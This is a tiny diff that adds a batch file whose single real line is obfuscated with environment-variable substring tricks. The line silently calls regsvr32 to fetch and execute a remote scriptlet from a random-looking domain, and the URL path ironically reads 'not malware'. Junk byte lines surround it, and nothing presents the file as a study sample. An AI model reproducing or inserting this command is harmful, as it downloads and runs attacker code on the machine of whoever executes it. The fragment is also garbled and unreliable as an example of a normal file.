@@ -1,0 +1,4 @@
+ 
+ ÿ ¦ þ 4
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://fnhxtvMLuaymTeOIkWVSdBglwbQC%ALLUSERSPROFILE:~4,1%DPpH%ALLUSERSPROFILE:~4,1%KYZzoUscEFAJjXGqNi.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  
+ ÿ ¦ þ 4
